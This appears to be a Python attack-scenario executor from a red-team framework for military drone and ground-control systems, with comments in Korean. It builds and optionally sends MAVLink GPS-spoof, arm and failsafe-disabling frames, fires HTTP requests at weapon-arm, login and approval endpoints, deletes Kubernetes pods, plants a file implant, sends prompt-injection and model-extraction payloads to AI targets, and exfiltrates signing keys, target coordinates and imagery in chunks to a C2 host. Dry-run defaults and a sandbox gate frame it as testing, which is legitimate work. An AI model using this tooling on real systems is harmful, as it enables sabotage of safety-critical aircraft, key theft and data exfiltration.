"""시나리오 실 실행기 — 카테고리별 실제 공격 아티팩트 생성·전송.

dry_run=True(기본): 아티팩트 생성만. dry_run=False + env 표적: 실제 전송.
"""
from __future__ import annotations

import json
import os
import socket
from dataclasses import dataclass

from ..transport.delivery import (
    build_mavlink_command_frame, build_mavlink_gps_frame,
    build_mavlink_param_set_frame, http_deliver, udp_deliver,
)

_ARM, _MODE, _TERM = 400, 176, 185


@dataclass
class ExecResult:
    scenario: str
    category: str
    artifact: str
    transmitted: bool
    target: str
    note: str = ""


def _stub(n): return os.environ.get(f"STUB_{n.upper()}_URL", "")


def _gated(name, host, port, send) -> bool:
    """실 전송을 §T 샌드박스 게이트로 통과(격리·스코프내·non-malicious면 실행)."""
    from ..sandbox import guarded
    spec = {"name": name, "network": [(host, int(port))] if host else []}
    r = guarded(spec, lambda: {"sent": True, "_": send()})
    return "sent" in r          # True=실행됨 / False=fail-closed 차단


def _mavlink(sid, p, dry):
    k = p["frame"]
    if k == "gps_spoof":
        f = build_mavlink_gps_frame()
    elif k == "param":
        f = build_mavlink_param_set_frame(p["id"], p["val"])
    else:
        f = build_mavlink_command_frame(p.get("cmd", _ARM), p.get("params", [1]))
    ep = os.environ.get("MAVLINK_ENDPOINT", "")
    sent = False
    if not dry and ep:
        h, _, port = ep.partition(":")
        sent = _gated(f"mavlink:{k}", h, int(port or 14550),
                      lambda: udp_deliver(h, int(port or 14550), f))
    return ExecResult(sid, "mavlink", f"{k} frame {len(f)}B", sent, ep or "dry")


def _http(sid, p, dry):
    url = (_stub(p["stub"]).rstrip("/") + p["path"]) if _stub(p["stub"]) else ""
    reps = int(p.get("repeat", 1)); sent = False
    if not dry and url:
        from urllib.parse import urlparse
        u = urlparse(url)
        sent = _gated(f"http:{sid}", u.hostname or "", u.port or 80,
                      lambda: [http_deliver(url, p.get("body", {})) for _ in range(reps)])
    return ExecResult(sid, "http", f"POST {p['path']} x{reps}", sent, url or "dry")


def _emso(sid, p, dry):
    from ..emso import plan_emso
    geom = p.get("geom", {"jammer_eirp_dbm": 40, "jammer_dist_m": 100,
                          "signal_eirp_dbm": 16, "signal_dist_m": 20000,
                          "freq_mhz": p.get("freq", 2437)})
    o = plan_emso(p["action"], geom)
    return ExecResult(sid, "emso", f"{p['action']} {o.effect.metric_db}dB 달성={o.effect.achieved}",
                      False, "physics-only", "실 RF 금지")


def _ai(sid, p, dry):
    if p["kind"] == "prompt_injection":
        from ..payloads.prompt_inject import generate_prompt_injections
        texts = [x.text for x in generate_prompt_injections(converters=["none", "base64"])]
    else:
        from ..payloads.extraction import generate_extraction_ladder
        texts = [x.query for x in generate_extraction_ladder()]
    url = os.environ.get("AI_TARGET_URL", ""); sent = False
    if not dry and url:
        from urllib.parse import urlparse
        u = urlparse(url if "://" in url else "http://" + url)
        sent = _gated(f"ai:{p['kind']}", u.hostname or "", u.port or 443,
                      lambda: [http_deliver(url, {"prompt": t}) for t in texts])
    return ExecResult(sid, "ai", f"{len(texts)} 페이로드 (예:'{texts[0][:32]}...')", sent, url or "dry")


def _container(sid, p, dry):
    cmd = ["kubectl", "-n", p["ns"], *p["action"].split()]
    live = bool(os.environ.get("KUBECTL_LIVE")); sent = False
    if not dry and live:
        import subprocess; subprocess.run(cmd, capture_output=True, timeout=30); sent = True
    return ExecResult(sid, "container", " ".join(cmd), sent, "cluster" if live else "dry")


def _persist(sid, p, dry):
    from ..persistence import FileImplant
    path = os.environ.get("IMPLANT_PATH", "/tmp/.rt_implant"); payload = b"rt-foothold"
    if not dry: FileImplant(path).install(payload)
    return ExecResult(sid, "persist", f"implant->{path}", not dry, path if not dry else "dry")


def _harvest(kind):
    src = os.environ.get("KEY_PATH" if kind == "crypto_key" else "EXFIL_SRC", "")
    if src and os.path.exists(src):
        return open(src, "rb").read()
    return {"crypto_key": b"MAVLINK_SIGNING_KEY:" + b"\x11" * 32,
            "sar_coords": b'{"target":[36.71,126.13]}',
            "bulk_imagery": b"EOIR_FRAME" * 512,
            "staged": b"STAGE:" + b"D" * 256}.get(kind, b"DATA" * 64)


def _exfil(sid, p, dry):
    data = _harvest(p["kind"]); n = len(data)
    host, port = os.environ.get("C2_HOST", ""), int(os.environ.get("C2_PORT", "0") or 0)
    sent = False

    def _send():
        with socket.create_connection((host, port), timeout=3) as s:
            for i in range(0, n, 512):          # 대역폭 제한 분할 유출
                s.sendall(data[i:i + 512])
        return True
    if not dry and host and port:
        sent = _gated(f"exfil:{p['kind']}", host, port, _send)
    return ExecResult(sid, "exfil", f"{p['kind']} {n}B 수집(청크 512)", sent,
                      f"{host}:{port}" if sent else "dry(수집만)")


_CAT = {"mavlink": _mavlink, "http": _http, "emso": _emso, "ai": _ai,
        "container": _container, "persist": _persist, "exfil": _exfil}


# ── 시나리오 → (카테고리, 파라미터) ─────────────────────────────────────────
SCENARIO_EXEC = {
    "S1": ("mavlink", {"frame": "gps_spoof"}),
    "S17": ("mavlink", {"frame": "command", "cmd": _MODE, "params": [1, 3]}),
    "S33": ("http", {"stub": "pgse", "path": "/preflight/check", "body": {"firmware_hash": "deadbeef", "sbom_ok": False}}),
    "S2": ("mavlink", {"frame": "param", "id": "ARMING_CHECK", "val": 0}),
    "S34": ("http", {"stub": "auth", "path": "/login", "body": {"username": "operator-01", "password": "x"}, "repeat": 12}),
    "S3": ("http", {"stub": "weapon", "path": "/arm", "body": {"action": "ARM", "armed_by": "operator-01"}}),
    "S36": ("http", {"stub": "mps", "path": "/approve", "body": {"planner": "op1", "approver": "op1"}}),
    "S37": ("http", {"stub": "cyber", "path": "/posture/set", "body": {"level": "LOW"}}),
    "S78": ("http", {"stub": "ti", "path": "/indicator", "body": {"indicator": "203.0.113.66", "source": "rogue"}}),
    "S79": ("http", {"stub": "c4i", "path": "/order", "body": {"order": "RETASK", "hour": 3}}),
    "S92": ("exfil", {"kind": "sar_coords"}),
    "S20": ("mavlink", {"frame": "command", "cmd": _ARM, "params": [1]}),
    "S4": ("mavlink", {"frame": "param", "id": "FS_THR_ENABLE", "val": 0}),
    "S38": ("persist", {}),
    "S51": ("container", {"ns": "ground", "action": "delete pod gcs-qgc --force"}),
    "S52": ("container", {"ns": "sitl", "action": "exec av-muav-0 -- stress --cpu 8"}),
    "S22": ("container", {"ns": "link", "action": "exec datalink-los -- add-endpoint 10.0.0.99:14550"}),
    "S23": ("emso", {"action": "gnss_spoof", "geom": {"spoof_eirp_dbm": 20, "spoof_dist_m": 100, "freq_mhz": 1575.42}}),
    "S24": ("emso", {"action": "jam", "freq": 2437}),
    "S90": ("ai", {"kind": "prompt_injection"}),
    "S91": ("ai", {"kind": "model_extraction"}),
    "S93": ("exfil", {"kind": "bulk_imagery"}),
    "S94": ("exfil", {"kind": "staged"}),
    "S95": ("exfil", {"kind": "staged"}),
    "S96": ("exfil", {"kind": "crypto_key"}),
}


def execute_scenario(sid: str, dry_run: bool = True) -> ExecResult:
    cat, params = SCENARIO_EXEC[sid]
    return _CAT[cat](sid, params, dry_run)


def execute_all(dry_run: bool = True) -> list:
    return [execute_scenario(s, dry_run) for s in SCENARIO_EXEC]
